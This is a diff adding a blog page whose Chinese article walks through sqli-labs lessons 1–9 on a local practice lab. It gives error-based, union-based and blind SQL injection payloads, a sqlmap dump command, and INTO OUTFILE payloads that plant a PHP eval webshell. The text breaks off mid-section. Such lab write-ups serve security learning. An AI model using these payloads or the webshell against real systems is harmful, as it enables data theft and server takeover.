@@ -1,0 +1,1128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="ctf, solution, note, blog">
+    
+    <meta name="author" content="Forestsetyou">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://forestsetyou.github.io/2023/11/01/security/range/[sqli-labs-master] - page_1/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="false">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Sqli-Labs-Master] - Page_1">
+<meta property="og:url" content="http://forestsetyou.github.io/2023/11/01/Security/Range/[Sqli-Labs-Master]%20-%20Page_1/index.html">
+<meta property="og:site_name" content="Festu&#39;s Blog">
+<meta property="og:description" content="false">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-10-31T17:04:00.000Z">
+<meta property="article:modified_time" content="2023-10-31T17:07:00.000Z">
+<meta property="article:author" content="Forestsetyou">
+<meta property="article:tag" content="ctf, solution, note, blog">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/hide_imgs/smiling_face.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/hide_imgs/smiling_face.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/hide_imgs/smiling_face.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            [Sqli-Labs-Master] - Page_1 -
+        
+        Festu&#39;s Blog
+    </title><meta name="robots" content="noindex">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Festu&#39;s Blog
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"forestsetyou.github.io","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":false,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/hide_imgs/light_banner-5.png","dark":"/hide_imgs/dark_banner.png"},"title":"Festu's Blog","subtitle":{"text":["Life Goes On."],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":false,"smart_backspace":false},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Forestsetyou","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"categories":{"path":"/categories","icon":"fa-regular fa-folder"},"tags":{"path":"/tags","icon":"fa-regular fa-tags"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/03/11 03:27:59"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/hide_imgs/smiling_face.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Festu&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                
+                
+                <img src="/hide_imgs/post_thumbnail.png" alt="[Sqli-Labs-Master] - Page_1" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">[Sqli-Labs-Master] - Page_1</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/hide_imgs/avatar.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Forestsetyou</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-11-01 01:04</span>
+        <span class="mobile">2023-11-01 01:04</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-11-01 01:07</span>
+            <span class="mobile">2023-11-01 01:07</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Security/">Security</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/Security/Range/">Range</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="Sqli-Labs-Master-Page1"><a href="#Sqli-Labs-Master-Page1" class="headerlink" title="Sqli-Labs-Master_Page1"></a>Sqli-Labs-Master_Page1</h1><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>字符型报错注入：<code>?id=1&#39;</code></p>
+<p>payload：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; or updatexml(1,concat(0x7e, (select substr(group_concat(secret_DUQL), 1, 32) from challenges.ygse7nvrdk), 0x7e),1)%23+</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>整型报错注入：<code>?id=1+1</code></p>
+<p>payload：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>, (<span class="keyword">select</span> substr(group_concat(secret_DUQL), <span class="number">1</span>, <span class="number">32</span>) <span class="keyword">from</span> challenges.ygse7nvrdk), <span class="number">0x7e</span>),<span class="number">1</span>)<span class="operator">%</span><span class="number">23</span><span class="operator">+</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>字符型报错注入，传入参数周围带有一个圆括号：<code>1&#39;</code></p>
+<p>payload：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;) or updatexml(1,concat(0x7e, (select substr(group_concat(secret_DUQL), 1, 32) from challenges.ygse7nvrdk), 0x7e),1)%23+</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>双引号字符型报错注入，有一个圆括号包裹：<code>1&quot;</code> </p>
+<p>payload：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;) or updatexml(1,concat(0x7e, (select substr(group_concat(secret_DUQL), 1, 32) from challenges.ygse7nvrdk), 0x7e),1)%23+</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>直接查询时查询成功也无无结果回显，但也就是个字符型报错注入</p>
+<p>payload：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(1,concat(0x7e, (select substr(group_concat(secret_DUQL), 1, 32) from challenges.ygse7nvrdk), 0x7e),1)%23+</span></span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<p>会发现题目中提示这里会用到一个”Double Injection”，双重注入，其实只是一种报错注入的技巧，payload：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1, concat((select substr(group_concat(secret_DUQL), 1, 32) from challenges.ygse7nvrdk), floor(rand(14)*2)) c, count(*) from information_schema.columns group by c;%23+</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>查询无回显的双引号字符型报错注入：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; or updatexml(1,concat(0x7e, (select substr(group_concat(secret_DUQL), 1, 32) from challenges.ygse7nvrdk), 0x7e),1)%23+</span><br></pre></td></tr></table></figure></div>
+
+<p>利用”DoubleInjection”：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; union select 1, concat((select substr(group_concat(secret_DUQL), 1, 32) from challenges.ygse7nvrdk), floor(rand(14)*2)) c, count(*) from information_schema.columns group by c;%23+</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>单引号字符型”写入文件”注入，参数周围包裹了两层括号。</p>
+<p>首先证明单引号可以注入：<code>1&#39;</code></p>
+<p>证明两层括号且查询出了3个字段：<code>1&#39;)) order by 3%23+</code></p>
+<p>利用 union 写入文件：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27;)) union select 1,2,&quot;&lt;?php @eval($_GET[&#x27;</span>cmd<span class="string">&#x27;]); ?&gt;&quot; into outfile &quot;F:/phpstudy_pro/www/sqli-labs-master/less-7/webshell.php&quot;;%23+</span></span><br></pre></td></tr></table></figure></div>
+
+<p>注意这里会返回”Syntax Error”，但本地查看发现文件是写进去了。查看题目源码会发现，当执行的”查询”语句没有返回结果时就默认输出”Syntax Error”。注意写入文件时已存在的文件不会被覆盖。</p>
+<p>写入 Shell 后直接访问：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost:<span class="number">83</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-7</span><span class="operator">/</span>webshell.php?cmd<span class="operator">=</span>echo<span class="operator">+</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>
+
+<p>GetShell成功。</p>
+<hr>
+<p>写入文件时，十六进制内容会被解码为字符串：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) union select 1,2,0x3c3f70687020406576616c28245f4745545b27636d64275d293b203f3e into outfile &quot;F:/phpstudy_pro/www/sqli-labs-master/less-7/webshell.php&quot;;%23+</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>无错误报告的字符型注入，可以写入文件，同时是一个布尔盲注</p>
+<p>验证无括号包裹：<code>?id=1&#39; order by 3;%23+</code> </p>
+<ol>
+<li><p>写入文件：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,0x3c3f70687020406576616c28245f4745545b27636d64275d293b203f3e into outfile &quot;F:/phpstudy_pro/www/sqli-labs-master/less-8/webshell.php&quot;;%23+</span></span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>布尔盲注：</p>
+<p>POC：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost:<span class="number">83</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select database()), 1, 1))=115;%23+</span></span><br></pre></td></tr></table></figure></div>
+
+<p>手动盲注纯受罪，Sqlmap一把梭：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://172.31.224.1:83/sqli-labs-master/Less-8/?<span class="built_in">id</span>=1 -p <span class="string">&#x27;id&#x27;</span> --technique B -D challenges -T ygse7nvrdk -C secret_DUQL --dump</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>字符型时间盲注，无括号包裹。</p>
+<p>特点：无论查询是否成功，数据库有无报错，本题都是同一个界面，这加大了测试的难度。</p>
+<p>在本地 Mysql 的测试中发现以下现象：</p>
+<ol>
+<li><p><code>Sleep(1)</code> 会睡眠近 10 秒。</p>
+<hr>
+<p>更新：查询了几行就执行几次函数，因此查询十行就会睡眠 10s。</p>
+<p>如：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">do sleep(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>睡眠 1s。</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> security.users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> sleep(<span class="number">1</span>) LIMIT <span class="number">1</span>,<span class="number">1</span>;#<span class="operator">+</span> LIMIT <span class="number">1</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>
+
+<p>由于检索了 12 条数据，一共睡眠了 12s。LIMIT 也不能改变睡眠时间。</p>
+</li>
+<li><p>在睡眠函数后用 or 额外拼接一个为 True 的表达式会导致睡眠函数不触发：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> security.users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>, sleep(<span class="number">1</span>), <span class="number">1</span>) <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span> LIMIT <span class="number">1</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>
+
+<p>上述语句不会延时。</p>
+<p>以下语句会延时 1s：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> security.users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>, sleep(<span class="number">1</span>), <span class="number">1</span>) LIMIT <span class="number">1</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<p>POC：</p>
+<p>利用 Sleep：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or if(1=1, sleep(0.1), 1) ;%23+</span></span><br></pre></td></tr></table></figure></div>
+
+<p>利用 <code>Benchmark</code>：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or if(1=1, benchmark(10000000, md5(&quot;hello&quot;)),1);%23+</span></span><br></pre></td></tr></table></figure></div>
+
+<p>利用字符串操作：</p>
